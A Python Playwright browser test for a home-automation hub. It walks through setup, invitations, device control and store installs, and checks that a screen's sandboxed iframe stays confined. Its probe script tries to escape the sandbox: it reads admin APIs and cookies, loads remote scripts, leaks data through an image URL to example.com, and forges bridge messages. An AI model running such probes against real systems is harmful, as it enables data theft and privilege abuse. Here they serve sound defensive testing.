"""Real-browser check: set up a hub, add a person, and prove their screen is held to its sandbox and its grants.

Needs Python and Playwright, so it is not part of `deno task test`. The easy way to run it:
    tests/browser/run.sh chromium
    tests/browser/run.sh webkit        # the engine Safari is built on
That starts a fresh hub, reads the code it prints, and runs this file against it.

By hand, against a hub that nobody has claimed yet:
    BROWSER=chromium python3 tests/browser/screen_sandbox.py http://127.0.0.1:8099 <code> [folder for screenshots]
Set CHROME_PATH to use a Chrome that is already installed. Exits 0 when every check passes.
"""
import asyncio, json, os, sys, urllib.request
from playwright.async_api import async_playwright

base, claim = sys.argv[1].rstrip("/"), sys.argv[2]
shots = sys.argv[3] if len(sys.argv) > 3 else None
OWNER_PIN, SAM_PIN = "482915", "739264"
LEVEL = "console/input/1/bus/1/level"
results = []

def check(name, ok, detail=""):
    results.append(bool(ok))
    print(("PASS  " if ok else "FAIL  ") + name + (f"\n      {detail}" if detail and not ok else ""))
    return ok

# Run inside the screen: try every way out, report what happened.
PROBES = """
async () => {
  const out = {};
  const attempt = async (name, fn) => { try { await fn(); out[name] = "ALLOWED"; } catch (e) { out[name] = "blocked"; } };
  const socket = (url) => new Promise((ok, no) => { const w = new WebSocket(url); w.onopen = () => { w.close(); ok(); }; w.onerror = () => no(new Error("refused")); });
  const base = document.baseURI.split("/screens/")[0];
  await attempt("read the hub's log over HTTP", () => fetch(base + "/api/log"));
  await attempt("ask the hub who is signed in", () => fetch(base + "/auth/me"));
  await attempt("use the superuser's tools", () => fetch(base + "/admin/api/all"));
  await attempt("open its own connection to the hub", () => socket(base.replace("http", "ws") + "/ws?screen=one-fader"));
  await attempt("reach the internet", () => fetch("https://example.com", { mode: "no-cors" }));
  await attempt("load a script from the internet", () => new Promise((ok, no) => { const s = document.createElement("script"); s.src = "https://example.com/x.js"; s.onload = ok; s.onerror = () => no(new Error()); document.head.append(s); }));
  await attempt("send data out through an image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error()); i.src = "https://example.com/leak.png?secret=1"; }));
  await attempt("read the page around it", () => parent.document.title);
  await attempt("read the hub page's storage", () => localStorage.getItem("x"));
  await attempt("read the session cookie", () => { if (!document.cookie) throw new Error("nothing"); });
  await attempt("open a popup", () => { const w = window.open("https://example.com"); if (!w) throw new Error(); w.close(); });
  await attempt("send the whole page somewhere else", () => { top.location.href = "https://example.com"; });
  out.origin = self.origin;
  return out;
}
"""

ASK = """([plugin, key, value]) => new Promise((res) => {
  const ref = "probe-" + Math.random();
  addEventListener("message", (e) => { if (e.data.type === "ack" && e.data.ref === ref) res(e.data); });
  parent.postMessage({ type: "set", plugin, key, value, ref }, "*");
  setTimeout(() => res({ timeout: true }), 1500);
})"""

async def main():
    async with async_playwright() as p:
        engine = os.environ.get("BROWSER", "chromium")
        opts = {"args": ["--no-sandbox"]} if engine == "chromium" else {}
        if engine == "chromium" and os.environ.get("CHROME_PATH"): opts["executable_path"] = os.environ["CHROME_PATH"]
        b = await getattr(p, engine).launch(**opts)
        print(f"browser: {engine} {b.version}")
        phone = dict(viewport={"width": 390, "height": 844}, has_touch=True, is_mobile=True, device_scale_factor=2)
        errors = []

        # --- The owner sets up the hub ---
        owner_ctx = await b.new_context(**phone)
        owner = await owner_ctx.new_page()
        owner.on("pageerror", lambda e: errors.append(str(e)))
        await owner.goto(base + "/")
        check("a new hub sends everyone to setup", owner.url.endswith("/setup"), owner.url)
        await owner.fill("#code", claim); await owner.fill("#name", "Evan")
        await owner.fill("#secret", OWNER_PIN); await owner.fill("#again", OWNER_PIN)
        if shots: await owner.screenshot(path=f"{shots}/1-setup.png")
        await owner.click("#go"); await owner.wait_for_url("**/admin")
        check("claiming it signs the owner in and lands them where setting up happens", True)
        await owner.wait_for_selector("#setup:not([hidden]) .step")
        todo = await owner.locator("#setup .step:not(.done)").all_inner_texts()
        check("a new owner is shown what is left to do, in order", [t.split("\n")[0] for t in todo] == ["Give a screen a device", "Add your people"], str(todo))
        if shots: await owner.screenshot(path=f"{shots}/1b-first-look.png")

        # --- The admin is five places, each at its own address ---
        async def place(name):
            await owner.locator("#places a", has_text=name).click()
        async def shown():
            return await owner.evaluate("() => [...document.querySelectorAll('.place')].filter((p) => !p.hidden).map((p) => p.dataset.place)")
        # A change that hands out power is confirmed once, and that holds for a few minutes.
        async def confirm():
            if await owner.locator("#confirm").count(): await owner.fill("#confirm", OWNER_PIN)
        check("there are five places", await owner.locator("#places a").all_inner_texts() == ["Home", "Devices", "Screens", "People", "Hub"])
        check("a new owner starts at Home, which says how the hub is", await shown() == [""] and "Everything is working" in await owner.locator("#homeStatus").inner_text(), await owner.locator("#home").inner_text())
        check("Home lists each device and how it is", await owner.locator("#homeDeviceList a.line").count() == 2 and "Connected to its device" in await owner.locator("#homeDeviceList").inner_text(), await owner.locator("#homeDeviceList").inner_text())
        check("with nothing waiting, nothing claims to need you", not await owner.locator("#needs").is_visible())
        await place("Devices")
        check("choosing a place changes the address and shows only that place", owner.url.endswith("/admin/devices") and await shown() == ["devices"] and await owner.title() == "Devices | Skillfully", owner.url)
        await owner.locator("#drivers h3 a", has_text="Simulated switch").click()
        check("each device has an address of its own, showing only it", owner.url.endswith("/admin/devices/sim-switch") and await owner.locator("#drivers .item").count() == 1, owner.url)
        await owner.reload(); await owner.wait_for_selector("#drivers .item")
        check("which survives loading the page again", await shown() == ["devices"] and await owner.locator("#drivers h3").all_inner_texts() == ["Simulated switch"])
        await owner.go_back(); await owner.wait_for_function("() => document.querySelectorAll('#drivers .item').length === 2")
        check("and the back button goes back", owner.url.endswith("/admin/devices"), owner.url)
        await owner.goto(base + "/admin/devices/no-such-thing"); await owner.wait_for_selector("#drivers .item")
        check("an address for a device that is not there says so and shows the ones that are", await owner.locator("#oneDeviceGone").is_visible() and await owner.locator("#drivers .item").count() == 2)
        await owner.goto(base + "/admin/people"); await owner.wait_for_selector("#people .item")
        check("an address can be opened directly", await shown() == ["people"])
        if shots: await owner.screenshot(path=f"{shots}/1c-people-place.png")
        # On a phone the places are along the bottom, under a thumb. On a wide screen they are down the side.
        size = owner.viewport_size
        bar = await owner.locator("#places").bounding_box()
        check("on a phone the places run along the bottom", bar["width"] > bar["height"] and bar["y"] + bar["height"] >= size["height"] - 1, str(bar))
        await owner.set_viewport_size({"width": 1280, "height": 800})
        bar = await owner.locator("#places").bounding_box(); card = await owner.locator("#secPeople").bounding_box()
        check("on a wide screen they run down the side, clear of the page", bar["height"] > bar["width"] and bar["x"] == 0 and card["x"] >= bar["width"], f"{bar} {card}")
        if shots: await owner.screenshot(path=f"{shots}/1d-wide.png")
        await owner.set_viewport_size(size)

        async def admin(path, body):
            r = await owner_ctx.request.post(base + path, data=json.dumps(body), headers={"content-type": "application/json"})
            return await r.json()
        async def state(plugin):
            return await (await owner_ctx.request.get(f"{base}/api/state?plugin={plugin}")).json()

        # --- The owner adds Sam, through the People page ---
        await owner.goto(base + "/admin/screens")
        # --- A screen reaches nothing until the owner gives it a connection ---
        async def give(screen, *devices):
            item = owner.locator("#screens .item", has=owner.locator("h3", has_text=screen))
            await item.get_by_role("button", name="Choose connections").click()
            for d in devices:
                await owner.locator("#dlgBody label.check", has_text=d).locator("input").check()
            await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
            return item
        await owner.wait_for_selector("#screens .item")
        fader_item = owner.locator("#screens .item", has=owner.locator("h3", has_text="One fader"))
        check("a new hub has given no screen any connection", "No connections yet" in await fader_item.inner_text(), await fader_item.inner_text())
        await give("One fader", "Simulated board")
        await owner.wait_for_selector("#screens .chip.on:has-text('Simulated board')")
        check("the owner gives One fader the soundboard, with their own PIN", True)
        check("having confirmed once, the page says for how long that holds", await owner.locator("#lockbar").is_visible() and "Unlocked for 5 minutes" in await owner.locator("#lockbar").inner_text(), await owner.locator("#lockbar").inner_text())

        await place("People")
        await owner.fill("#newName", "Sam"); await owner.click("#add button")
        await owner.get_by_text("Add the suggested role Musician").click()
        await owner.wait_for_selector("#roles h3:has-text('Musician')")
        check("a screen's suggested role can be added in one tap", True)
        sam = owner.locator(".item", has=owner.locator("h3", has_text="Sam"))
        await sam.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Musician").locator("input").check()
        check("and the next change is not asked to be confirmed again", await owner.locator("#confirm").count() == 0)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Assign").click()
        check("the People page asks for what the screen's abilities need per person", await owner.locator("#slot_ears").count() == 1)
        await owner.fill("#slot_ears", "1"); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Invite").click()
        invite = (await owner.locator("#dlgBody .code").inner_text()).strip()
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("an invitation is shown for Sam", len(invite) == 9, invite)
        if shots: await owner.screenshot(path=f"{shots}/2-people.png", full_page=True)

        # --- Sam joins on another phone ---
        sam_ctx = await b.new_context(**phone)
        pg = await sam_ctx.new_page()
        pg.on("pageerror", lambda e: errors.append(str(e)))
        await pg.goto(base + "/")
        check("someone who is not signed in is sent to sign in", pg.url.endswith("/signin"), pg.url)
        await pg.goto(f"{base}/join#{invite}")
        await pg.fill("#secret", SAM_PIN); await pg.fill("#again", SAM_PIN); await pg.click("#go")
        await pg.wait_for_url("**/s/one-fader"); await pg.wait_for_timeout(900)
        check("joining lands Sam on the musician's home screen", True)
        fr = next((f for f in pg.frames if "/screens/one-fader/" in f.url), None)
        if not check("the screen is framed", fr is not None): await b.close(); return
        check("the screen is linked to the hub through the shell", await fr.inner_text("#linkText") == "Connected")

        # The screen says "ready" once. Whichever of the frame's script and the screen's page arrives first, the
        # screen must end up connected. Here the frame's script is held back, and then the screen's page is.
        async def linked_when_late(what, pattern):
            late = await sam_ctx.new_page()
            async def hold(route):
                await asyncio.sleep(1.5)
                await route.continue_()
            await late.route(pattern, hold)
            await late.goto(f"{base}/s/one-fader")
            ok = True
            try:
                await late.frame_locator("#screen").locator("#linkText", has_text="Connected").wait_for(timeout=8000)
            except Exception:
                ok = False
            check(f"the screen connects when {what} arrives late", ok)
            await late.close()
        await linked_when_late("the frame's own script", "**/_hub/shell.js")
        await linked_when_late("the screen's page", "**/screens/one-fader/index.html")
        check("it knows which ear mix is Sam's", "bus 1" in await fr.inner_text("#inputName"), await fr.inner_text("#inputName"))
        check("the shell shows who is signed in", await pg.inner_text("#who") == "Sam")
        links = await pg.locator("#links a").all_text_contents()
        check("Sam's menu has the ear mix and the account, and no superuser tools", links == ["One fader", "Account"], str(links))

        # Drag the fader. Pointer moves from a mouse reach the page the same way a finger's do, in every engine.
        box = await (await fr.query_selector("#fader")).bounding_box()
        y = box["y"] + box["height"] / 2
        xs = [box["x"] + box["width"] * (0.05 + 0.01 * k) for k in range(70)]
        before = (await state("sim-console"))[LEVEL]
        await pg.mouse.move(xs[0], y); await pg.mouse.down()
        for x in xs[1:]:
            await pg.mouse.move(x, y); await pg.wait_for_timeout(12)
        await pg.mouse.up()
        # What the screen believes the finger chose. A screen's frame can run in its own process, so the last
        # moves may land a moment after the call above returns: give them that moment. The screen ignores the
        # hub's answers for longer than this after a move, so what is read here is still the finger's choice.
        await pg.wait_for_timeout(150)
        chosen = float(await fr.get_attribute("#fader", "aria-valuenow"))
        await pg.wait_for_timeout(900)
        held = (await state("sim-console"))[LEVEL]
        shown = (await fr.inner_text("#db")).replace("\n", "").replace("dB", "")
        # Engines deliver the last few pointer moves of a fast drag differently, so where the drag ends is
        # allowed a little room. What must hold everywhere: the value the screen settled on is the one the
        # board ends up holding. A lost last move, or an old value snapping back, fails here.
        check("a drag moves the fader to about where the finger stopped", chosen != before and abs(chosen - -10) <= 1.5, f"started at {before}, the screen chose {chosen}")
        check("the board ends up holding what the screen chose", held == chosen, f"the screen chose {chosen}, the board holds {held}")
        check("the screen shows what the board holds", float(shown) == held, shown)
        log_text = await fr.inner_text("#log")
        check("the screen's history is filled through the bridge, as Sam's own", "You set the level" in log_text, log_text[:80])
        if shots: await pg.screenshot(path=f"{shots}/3-sam.png", full_page=True)

        # --- Now behave badly from inside the screen ---
        got = await fr.evaluate(PROBES)
        check("the screen has no origin of its own", got.pop("origin") == "null")
        for name, outcome in got.items():
            check(f"the screen cannot {name}", outcome == "blocked", outcome)
        await fr.evaluate("""() => { const f = document.createElement("form"); f.action = "https://example.com"; f.method = "post"; document.body.append(f); f.submit(); }""")
        await pg.wait_for_timeout(600)
        check("the screen cannot submit a form to the internet", "/screens/one-fader/" in fr.url and pg.url.endswith("/s/one-fader"), f"{fr.url} | {pg.url}")

        # Ask the hub, through the bridge, for things Sam was not granted.
        ack = await fr.evaluate(ASK, ["sim-switch", "switch/outlet/1/on", True])
        check("Sam's screen cannot flip a switch", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        ack = await fr.evaluate(ASK, ["sim-console", "console/input/1/bus/2/level", 10])
        check("Sam's screen cannot touch someone else's ear mix", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        check("the switch did not move", (await state("sim-switch"))["switch/outlet/1/on"] is False)
        check("the other ear mix did not move", (await state("sim-console"))["console/input/1/bus/2/level"] == -90)
        log = await (await owner_ctx.request.get(base + "/api/log?type=skillfully.command.rejected")).json()
        check("both attempts are in the log under Sam's ID", len(log) == 2 and all(e["via"] == "screen/one-fader" and e["actor"].startswith("p_") for e in log), json.dumps(log)[:200])
        check("a screen cannot say it is someone else", await fr.evaluate("""() => new Promise((res) => {
            addEventListener("message", (e) => { if (e.data.type === "hello") res(false); });
            parent.postMessage({ type: "hello", actor: "p_someoneelse" }, "*");
            setTimeout(() => res(true), 500);
        })"""))

        # --- The owner turns Sam off: the phone is cut off at once ---
        people = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["people"]
        sam_id = next(x["id"] for x in people if x["name"] == "Sam")
        await admin("/admin/api/person/disabled", {"id": sam_id, "disabled": True})
        await pg.wait_for_url("**/signin", timeout=5000)
        check("turning a person off signs their phone out within seconds", True)
        # WebKit reports a refused attempt to leave the sandbox as a page error. That is the sandbox working.
        unexpected = [e for e in errors if "allow-top-navigation" not in e]
        # --- A screen nobody wrote for a device: Controls, given only the switch ---
        await owner.goto(base + "/admin/screens"); await owner.wait_for_selector("#screens .item")
        await give("Controls", "Simulated switch")
        await owner.goto(base + "/s/controls"); await owner.wait_for_timeout(1200)
        cf = next((f for f in owner.frames if "/screens/controls/" in f.url), None)
        if check("Controls is framed like any other screen", cf is not None):
            cards = await cf.locator(".card h2").all_text_contents()
            check("it shows the switch it was given, and not the soundboard it was not", cards == ["Simulated switch"], str(cards))
            outlet = cf.locator(".row", has_text="switch/outlet/2/on")
            await outlet.get_by_role("button").click(); await owner.wait_for_timeout(700)
            check("pressing a value it was never written for changes the device", (await state("sim-switch"))["switch/outlet/2/on"] is True)
            check("and the screen shows what the device now holds", await outlet.get_by_role("button").inner_text() == "On")
            if shots: await owner.screenshot(path=f"{shots}/4-controls.png", full_page=True)

        # --- Adding a device nobody wrote a driver for, from the store, without leaving the admin page ---
        lamp_port = os.environ.get("LAMP_PORT", "7007")
        await owner.goto(base + "/admin/devices"); await owner.wait_for_selector("#addDevice:not([hidden])")
        await owner.click("#addDevice")
        check("nothing can be added before something is chosen", await owner.locator("#dlgOk").is_disabled())
        await owner.wait_for_selector("#shelf .shelfItem")
        shelf = await owner.locator("#shelf").inner_text()
        check("the store's shelf says what each thing is and how far it has been proven", "Test lamp" in shelf and "stand-in" in shelf, shelf)
        check("the hub knows who signed the store's list, so the page does not warn about it", await owner.locator("#unsigned").count() == 0, shelf)
        check("a store with only a few things does not need a search box", not await owner.locator("#shelfFind").is_visible())
        await owner.locator("#shelf .shelfItem", has_text="Test lamp").get_by_role("button", name="Choose").click()
        await owner.wait_for_selector("#pkgRest:not([hidden])")
        told = await owner.locator("#pkgRest").inner_text()
        check("choosing shows what it is, its license, and where it was built from", "skillfully-test-lamp 1.0.0" in told and "MIT license" in told and "its author's source" in told, told)
        check("and what the store lets it do without asking", "The store lets it, without asking you" in told and "you are asked first" in told)
        await owner.fill("#devName", "Stage lamp")
        await owner.locator("#pkgRest label.check", has_text="Controls").locator("input").check()
        await confirm()
        if shots: await owner.screenshot(path=f"{shots}/5-add-device.png", full_page=True)
        await owner.click("#dlgOk")
        # Its settings open by themselves, drawn from what the module says it takes.
        await owner.wait_for_selector("#set_host", timeout=15000)
        check("its own settings form opens next, with the module's own labels", "Lamp address" in await owner.locator("#dlgBody").inner_text())
        check("and its own defaults", await owner.input_value("#set_port") == "7000")
        await owner.fill("#set_host", "127.0.0.1"); await owner.fill("#set_port", lamp_port)
        if shots: await owner.screenshot(path=f"{shots}/6-settings.png", full_page=True)
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        lamp_item = owner.locator("#drivers .item", has=owner.locator("h3", has_text="Stage lamp"))
        # The store answered for the address it was given, so it connects and nobody is asked anything.
        await lamp_item.locator(".status.ok").wait_for(timeout=15000)
        card = await lamp_item.inner_text()
        check("the page says in plain words that it is connected", "Connected to its device" in card, card)
        check("and where it came from, under what license", "From the store" in card and "MIT license" in card and "Its author's source" in card, card)
        check("it arrives listening, and the page says what that means", "Listen" in card and "nothing is sent to it" in card)
        await lamp_item.get_by_role("button", name="Switch to Act").click()
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        if shots: await lamp_item.scroll_into_view_if_needed(); await owner.screenshot(path=f"{shots}/7-device.png")

        # --- The store publishes a newer version. The hub notices, and updating keeps what was decided ---
        check("a device at the store's version is not offered an update", await lamp_item.get_by_role("button", name="Update to 1.1.0").count() == 0)
        # Straight to this computer, whatever proxy the machine running the test is set up with.
        urllib.request.build_opener(urllib.request.ProxyHandler({})).open(f"http://127.0.0.1:{os.environ.get('STORE_PORT', '7008')}/publish-newer").read()
        await lamp_item.locator(".update").wait_for(timeout=20000)
        check("the page says the store has a newer version", "The store has a newer version, 1.1.0" in await lamp_item.inner_text(), await lamp_item.inner_text())
        await lamp_item.get_by_role("button", name="Update to 1.1.0").click()
        told = await owner.locator("#dlgBody").inner_text()
        check("updating says what stays and what happens", "keeps its name, its settings, and everything you allowed" in told and "used with the real device" in told and "stops for a moment" in told, told)
        await confirm()
        if shots: await owner.screenshot(path=f"{shots}/7b-update.png", full_page=True)
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await lamp_item.locator(".update").wait_for(state="detached", timeout=20000)
        await lamp_item.locator(".status.ok").wait_for(timeout=20000)
        card = await lamp_item.inner_text()
        check("after updating it is the new version, connected, still acting, still on its screen", "1.1.0" in card and "Connected to its device" in card and "Act" in card and "Used by: Controls" in card, card)

        # --- The same module from a file, which nobody has answered for: it has to ask ---
        await owner.click("#addDevice")
        await owner.set_input_files("#pkg", os.path.join(os.path.dirname(__file__), "..", "fixtures", "companion", "skillfully-test-lamp-1.0.0.tgz"))
        await owner.wait_for_selector("#pkgRest:not([hidden])")
        facts = await owner.locator("#pkgRest .facts").inner_text()
        check("from a file, it starts with no access to the network", "no access to your network" in facts and "Nobody has reviewed" in facts, facts)
        await owner.fill("#devName", "Spare lamp"); await confirm(); await owner.click("#dlgOk")
        await owner.wait_for_selector("#set_host", timeout=15000)
        await owner.fill("#set_host", "127.0.0.1"); await owner.fill("#set_port", lamp_port)
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        spare = owner.locator("#drivers .item", has=owner.locator("h3", has_text="Spare lamp"))
        await spare.locator(".status.wait").wait_for(timeout=15000)
        check("a device that needs something says it is waiting for you", "waiting for you" in await spare.inner_text(), await spare.inner_text())
        check("and has no access until you answer", "no access to your network" in await spare.inner_text())
        # Home is where something waiting on the superuser is seen first.
        await place("Home"); await owner.wait_for_selector("#needs:not([hidden]) .need")
        home = await owner.locator("#home").inner_text() + await owner.locator("#needs").inner_text()
        check("Home says something needs you, and what", "One thing needs you" in home and f"Spare lamp asks to reach another program on this computer, port {lamp_port}" in home, home)
        check("with the store's advice beside it", "The store's reviewers advise against this" in home, home)
        check("something the store advises against cannot be allowed with one tap", await owner.locator("#needs").get_by_role("button", name="Allow").count() == 0 and await owner.locator("#needs").get_by_role("button", name="See what it asks for").count() == 1)
        if shots: await owner.screenshot(path=f"{shots}/6a-home-needs-you.png", full_page=True)
        await owner.locator("#needs a.open").click()
        check("and it leads to the device itself", "/admin/devices/" in owner.url and await owner.locator("#drivers .item").count() == 1, owner.url)
        spare = owner.locator("#drivers .item", has=owner.locator("h3", has_text="Spare lamp"))
        await spare.get_by_role("button", name="See what it asks for").click()
        asked = await owner.locator("#dlgBody").inner_text()
        check("the question says what it wants in plain words", f"Reach another program on this computer, port {lamp_port}" in asked, asked)
        check("and warns when it is not the ordinary case", "only if you know what is listening there" in asked)
        check("and shows what the store's reviewers advise", "The store's reviewers advise against this" in asked and "run on the hub's own computer yourself" in asked, asked)
        box = owner.locator("#dlgBody .askBox")
        check("nothing unusual is ticked for you", not await box.is_checked())
        await box.check(); await confirm()
        if shots: await owner.screenshot(path=f"{shots}/6b-asks.png", full_page=True)
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await spare.locator(".status.ok").wait_for(timeout=15000)
        check("once allowed, it connects", "Connected to its device" in await spare.inner_text())
        # Locking ends the few minutes at once: the next change asks again.
        await owner.click("#lockNow"); await owner.wait_for_selector("#lockbar", state="hidden")
        check("locking hides the unlocked notice", not await owner.locator("#lockbar").is_visible())
        await spare.get_by_role("button", name="Remove").click()
        check("and after locking, a change asks for the PIN again", await owner.locator("#confirm").count() == 1)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => ![...document.querySelectorAll('#drivers h3')].some((h) => h.textContent === 'Spare lamp')")
        check("a device can be removed from the page", True)

        await owner.goto(base + "/s/controls"); await owner.wait_for_timeout(1500)
        cf = next((f for f in owner.frames if "/screens/controls/" in f.url), None)
        on = cf.locator(".row", has_text="generic/action/on")
        await on.get_by_role("button", name="Do it").click()
        reading = cf.locator(".row", has_text="generic/reading/power").locator(".value")
        for _ in range(40):
            if (await reading.inner_text()).strip() == "on": break
            await owner.wait_for_timeout(100)
        check("the device added a minute ago can be used from Controls", (await reading.inner_text()).strip() == "on", await reading.inner_text())
        if shots: await owner.screenshot(path=f"{shots}/8-controls-lamp.png", full_page=True)

        check("no page errors", not unexpected, "; ".join(unexpected))
        await b.close()

asyncio.run(main())
print(f"\n{sum(results)} of {len(results)} checks passed")
sys.exit(0 if all(results) else 1)
